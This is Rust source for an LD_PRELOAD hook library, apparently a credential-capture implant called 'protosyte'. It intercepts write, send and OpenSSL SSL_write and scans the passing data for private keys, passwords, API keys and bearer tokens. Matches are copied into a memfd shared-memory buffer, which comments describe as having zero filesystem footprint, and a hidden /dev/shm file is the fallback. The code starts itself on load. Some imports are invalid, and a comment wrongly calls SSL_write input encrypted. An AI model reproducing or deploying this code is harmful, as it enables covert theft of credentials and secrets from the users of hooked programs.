// Linux LD_PRELOAD Hook Library
// This library intercepts libc functions (write, send, SSL_write) 
// and forwards captured data to a shared memory ring buffer

use std::ffi::{CString, c_void, c_char, c_int, c_size_t};
use std::os::raw::c_ssize_t;
use std::ptr;
use std::sync::atomic::{AtomicPtr, Ordering};
use libc::{dlopen, dlsym, RTLD_NEXT, FILE, O_CREAT, O_RDWR, O_TRUNC, S_IRUSR, S_IWUSR, 
           mmap, MAP_SHARED, PROT_READ | PROT_WRITE, close, open, write as sys_write};
#[cfg(target_os = "linux")]
use nix::unistd::Fd;
use std::os::unix::io::{RawFd, AsRawFd};

// Type definitions for hooked functions
type WriteFn = extern "C" fn(fd: c_int, buf: *const c_void, count: c_size_t) -> c_ssize_t;
type SendFn = extern "C" fn(sockfd: c_int, buf: *const c_void, len: c_size_t, flags: c_int) -> c_ssize_t;
type SSLSendFn = extern "C" fn(ssl: *mut c_void, buf: *const c_void, num: c_int) -> c_int;

static ORIG_WRITE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
static ORIG_SEND: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
static ORIG_SSL_WRITE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());

// Shared memory ring buffer
const BUFFER_SIZE: usize = 1024 * 1024; // 1MB
static mut RING_BUFFER: *mut u8 = ptr::null_mut();
static mut RING_BUFFER_FD: c_int = -1;

// Initialize shared memory buffer using memfd (memory-only, no filesystem)
#[no_mangle]
pub extern "C" fn init_hook_buffer() -> c_int {
    unsafe {
        // Use memfd_create for anonymous shared memory (zero filesystem footprint)
        // memfd files don't appear in /proc/filesystems and are automatically cleaned up
        #[cfg(target_os = "linux")]
        use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
        #[cfg(target_os = "linux")]
        use nix::unistd::ftruncate;
        
        let name = CString::new("protosyte_ringbuf").unwrap();
        let fd = match memfd_create(&name, MemFdCreateFlag::MFD_CLOEXEC | MemFdCreateFlag::MFD_ALLOW_SEALING) {
            Ok(fd) => fd.as_raw_fd(),
            Err(_) => {
                // Fallback to /dev/shm if memfd not available (older kernels)
                let pid = std::process::id();
                // Use libc random() for compatibility (no external dependencies)
                let random = unsafe { libc::random() };
                let shm_path = format!("/dev/shm/.protosyte_{}_{}", pid, random);
                let path_cstr = CString::new(shm_path).unwrap();
                let fallback_fd = open(path_cstr.as_ptr(), O_CREAT | O_RDWR | O_TRUNC, S_IRUSR | S_IWUSR);
                if fallback_fd < 0 {
                    return -1;
                }
                fallback_fd
            }
        };
        
        // Truncate to buffer size
        #[cfg(target_os = "linux")]
        if nix::unistd::ftruncate(nix::unistd::Fd::from_raw_fd(fd), BUFFER_SIZE as i64).is_err() {
            close(fd);
            return -1;
        }
        
        // Map into memory
        let addr = mmap(
            ptr::null_mut(),
            BUFFER_SIZE,
            PROT_READ | PROT_WRITE,
            MAP_SHARED,
            fd,
            0,
        );
        
        #[cfg(target_os = "linux")]
        if addr == libc::MAP_FAILED as *mut _ {
            close(fd);
            return -1;
        }
        
        RING_BUFFER = addr as *mut u8;
        RING_BUFFER_FD = fd;
        
        // Initialize ring buffer header (offset tracking)
        ptr::write(RING_BUFFER as *mut u64, 8); // Start after header (8 bytes)
        
        0
    }
}

// Write data to ring buffer
unsafe fn write_to_buffer(data: &[u8]) {
    if RING_BUFFER.is_null() {
        return;
    }
    
    // Get current write offset (first 8 bytes are offset)
    let offset_ptr = RING_BUFFER as *mut u64;
    let mut offset = ptr::read(offset_ptr);
    
    // Write data
    let data_len = data.len();
    if offset + data_len as u64 > BUFFER_SIZE as u64 {
        offset = 8; // Wrap around, skip header
    }
    
    let write_ptr = RING_BUFFER.offset(offset as isize);
    ptr::copy_nonoverlapping(data.as_ptr(), write_ptr, data_len);
    
    // Update offset
    offset += data_len as u64;
    ptr::write(offset_ptr, offset);
}

// Get original function using RTLD_NEXT
unsafe fn get_original(symbol: &str) -> *mut c_void {
    let symbol_cstr = CString::new(symbol).unwrap();
    dlsym(RTLD_NEXT, symbol_cstr.as_ptr())
}

// Hooked write() function
#[no_mangle]
pub extern "C" fn write(fd: c_int, buf: *const c_void, count: c_size_t) -> c_ssize_t {
    unsafe {
        // Get original write function
        if ORIG_WRITE.load(Ordering::Relaxed).is_null() {
            let orig = get_original("write");
            if !orig.is_null() {
                ORIG_WRITE.store(orig, Ordering::Relaxed);
            } else {
                return -1;
            }
        }
        
        let orig_write: WriteFn = std::mem::transmute(ORIG_WRITE.load(Ordering::Relaxed));
        
        // Capture data (only for file descriptors we care about)
        if fd >= 0 && fd != RING_BUFFER_FD {
            let data = std::slice::from_raw_parts(buf as *const u8, count);
            
            // Check if data matches our patterns (credentials, keys, etc.)
            if should_capture(data) {
                write_to_buffer(data);
            }
        }
        
        // Call original function
        orig_write(fd, buf, count)
    }
}

// Hooked send() function (Winsock/BSD sockets)
#[no_mangle]
pub extern "C" fn send(sockfd: c_int, buf: *const c_void, len: c_size_t, flags: c_int) -> c_ssize_t {
    unsafe {
        if ORIG_SEND.load(Ordering::Relaxed).is_null() {
            let orig = get_original("send");
            if !orig.is_null() {
                ORIG_SEND.store(orig, Ordering::Relaxed);
            } else {
                return -1;
            }
        }
        
        let orig_send: SendFn = std::mem::transmute(ORIG_SEND.load(Ordering::Relaxed));
        
        // Capture network data
        let data = std::slice::from_raw_parts(buf as *const u8, len);
        if should_capture(data) {
            write_to_buffer(data);
        }
        
        orig_send(sockfd, buf, len, flags)
    }
}

// Hooked SSL_write() function (OpenSSL)
#[no_mangle]
pub extern "C" fn SSL_write(ssl: *mut c_void, buf: *const c_void, num: c_int) -> c_int {
    unsafe {
        if ORIG_SSL_WRITE.load(Ordering::Relaxed).is_null() {
            let orig = get_original("SSL_write");
            if !orig.is_null() {
                ORIG_SSL_WRITE.store(orig, Ordering::Relaxed);
            } else {
                return -1;
            }
        }
        
        let orig_ssl_write: SSLSendFn = std::mem::transmute(ORIG_SSL_WRITE.load(Ordering::Relaxed));
        
        // Capture encrypted data (will be decrypted later)
        let data = std::slice::from_raw_parts(buf as *const u8, num as usize);
        if should_capture(data) {
            write_to_buffer(data);
        }
        
        orig_ssl_write(ssl, buf, num)
    }
}

// Pattern matching to determine if data should be captured
// Simple pattern matching without regex dependency for minimal library size
fn should_capture(data: &[u8]) -> bool {
    // Convert to string if possible
    if let Ok(text) = std::str::from_utf8(data) {
        let text_lower = text.to_lowercase();
        
        // Check for private keys
        if text.contains("-----BEGIN") && text.contains("PRIVATE KEY-----") {
            return true;
        }
        
        // Check for password patterns (simple substring matching)
        if text_lower.contains("password=") || text_lower.contains("passwd=") || 
           text_lower.contains("pwd=") || text_lower.contains("password:") {
            return true;
        }
        
        // Check for API keys (look for api_key= or apikey=)
        if text_lower.contains("api_key=") || text_lower.contains("apikey=") ||
           text_lower.contains("api-key=") {
            // Check if value is reasonably long (at least 20 chars after =)
            if let Some(eq_pos) = text_lower.find('=') {
                let value_part = &text[eq_pos + 1..];
                if value_part.len() >= 20 {
                    return true;
                }
            }
        }
        
        // Check for tokens (bearer, authorization headers)
        if text_lower.contains("bearer ") || text_lower.contains("authorization:") ||
           text_lower.contains("token=") {
            return true;
        }
    }
    
    false
}

// Constructor - runs when library loads
#[ctor::ctor]
fn init() {
    unsafe {
        init_hook_buffer();
    }
}

